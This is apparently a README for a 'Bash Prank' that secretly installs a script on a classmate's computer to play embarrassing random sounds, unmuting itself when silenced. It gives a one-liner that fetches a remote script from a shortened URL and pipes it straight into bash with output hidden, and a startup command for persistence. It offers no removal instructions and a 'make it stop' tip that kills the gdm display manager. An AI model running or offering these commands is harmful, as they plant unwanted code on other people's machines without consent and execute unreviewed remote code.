Bash Prank
-----------
Imagine you are in class.
Someone - we wont say who - opens up their terminal.
Then they close it.
Then after a random time interval - say anywhere from 1 to 300 seconds
a random sound plays.
Oh, it can be an embarrassing sound.
Did you say they had headphones on?
Didn't work very well for them now did it?
Did you say they tried muting it?
Ahh - you mean it unmuted and went to full volume a second later.

##ONE LINER##
```bash
curl -L http://git.to/pal | bash -s > /dev/null 2>&1
```

##Startup Command##
https://help.ubuntu.com/community/AddingProgramToSessionStartup
```bash
. ~/.config/al/al.sh & disown $!
```

## Removal Instructions ##
Really? You want to get rid of this amazing piece of code that inhances your life more than sliced bread?

## Make it stop ##
I recommend:
```bash
killall gdm > /dev/null 2>&1
```